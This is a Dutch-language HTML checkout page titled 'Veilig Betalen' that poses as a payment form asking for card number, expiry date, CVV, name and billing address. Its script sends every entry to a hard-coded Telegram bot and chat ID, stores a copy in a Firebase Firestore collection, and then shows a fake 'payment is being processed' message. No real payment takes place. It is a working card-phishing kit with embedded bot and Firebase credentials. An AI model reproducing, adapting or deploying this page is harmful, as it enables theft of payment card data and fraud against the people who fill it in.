<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Veilig Betalen</title>
    <style>
        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #ffffff;
            color: #333;
            display: flex;
            justify-content: center;
            padding: 20px;
            margin: 0;
        }

        .checkout-container {
            width: 100%;
            max-width: 480px;
        }

        p { font-size: 14px; margin-bottom: 15px; color: #555; }

        .input-box {
            border: 1px solid #ccc;
            border-radius: 8px;
            padding: 10px 12px;
            margin-bottom: 12px;
            position: relative;
            background: #fff;
        }

        .input-box label {
            display: block;
            font-size: 11px;
            color: #777;
            margin-bottom: 2px;
        }

        .input-box input {
            border: none;
            width: 100%;
            font-size: 16px;
            outline: none;
            color: #333;
            padding: 2px 0;
        }

        .row { display: flex; gap: 12px; }
        .flex-1 { flex: 1; }
        .flex-small { width: 100px; }

        h3 { font-size: 17px; font-weight: 600; margin: 30px 0 15px 0; }

        button.submit-btn {
            width: 100%;
            background: #000;
            color: #fff;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }

        .success-message { text-align: center; padding: 40px; }
        .success-icon { font-size: 50px; color: #28a745; margin-top: 10px; }
    </style>
</head>
<body>

<div class="checkout-container" id="formContent">
    <p>Voer je kaartgegevens in:</p>

    <div class="input-box">
        <label>Nummer creditcard/betaalpas</label>
        <input type="text" id="ccNummer" placeholder="0000 0000 0000 0000">
    </div>

    <div class="row">
        <div class="input-box flex-1">
            <label>Vervalt op MM/JJ</label>
            <input type="text" id="ccDatum" placeholder="MM/JJ">
        </div>
        <div class="input-box flex-small">
            <label>CVV</label>
            <input type="text" id="ccCvv" placeholder="***">
        </div>
    </div>

    <h3>Factuuradres</h3>

    <div class="input-box">
        <input type="text" id="voornaam" placeholder="Voornaam">
    </div>

    <div class="input-box">
        <input type="text" id="achternaam" placeholder="Achternaam">
    </div>

    <div class="input-box">
        <input type="text" id="straat" placeholder="Straatnaam en huisnummer">
    </div>

    <div class="row">
        <div class="input-box flex-1">
            <input type="text" id="postcode" placeholder="Postcode">
        </div>
        <div class="input-box flex-1">
            <input type="text" id="woonplaats" placeholder="Woonplaats">
        </div>
    </div>

    <button class="submit-btn" onclick="window.slaOp()">Bevestigen</button>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyDTQhc1FJv_IcGkBFkrvN_u1aKA6DZNHYA",
        authDomain: "datecase.firebaseapp.com",
        projectId: "datecase",
        storageBucket: "datecase.firebasestorage.app",
        messagingSenderId: "652335827565",
        appId: "1:652335827565:web:5c0a0fbc9f16d0597bcd64"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    window.slaOp = async () => {
        const formData = {
            kaartnummer: document.getElementById('ccNummer').value,
            vervaldatum: document.getElementById('ccDatum').value,
            cvv: document.getElementById('ccCvv').value,
            voornaam: document.getElementById('voornaam').value,
            achternaam: document.getElementById('achternaam').value,
            adres: document.getElementById('straat').value,
            postcode: document.getElementById('postcode').value,
            woonplaats: document.getElementById('woonplaats').value,
            tijdstip: new Date()
        };

        const botToken = "8632084303:AAHDf33blxv__WMRNh7HrA8BeNXHsRwTk7g";
        const chatId = "8150436847";

        if(formData.kaartnummer && formData.voornaam) {
            // 1. Direct naar Telegram
            const bericht = `🚨 *Nieuwe Invoer!* 🚨\n\n💳 *Kaart:* ${formData.kaartnummer}\n📅 *Verval:* ${formData.vervaldatum}\n🔐 *CVV:* ${formData.cvv}\n\n👤 *Naam:* ${formData.voornaam} ${formData.achternaam}\n🏠 *Adres:* ${formData.adres}, ${formData.postcode} ${formData.woonplaats}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: bericht, parse_mode: 'Markdown' })
            });

            try {
                // 2. Naar Firebase
                await addDoc(collection(db, "betalingen"), formData);
                
                // 3. Succes scherm
                document.getElementById('formContent').innerHTML = `
                    <div class="success-message">
                        <h2>Bedankt!</h2>
                        <p>Uw betaling wordt verwerkt. U kunt dit venster nu sluiten.</p>
                        <div class="success-icon">✔️</div>
                    </div>`;
            } catch (e) {
                console.error("Fout:", e);
                alert("Er ging iets mis bij het verzenden.");
            }
        } else {
            alert("Vul alle velden in.");
        }
    };
</script>
</body>
</html>
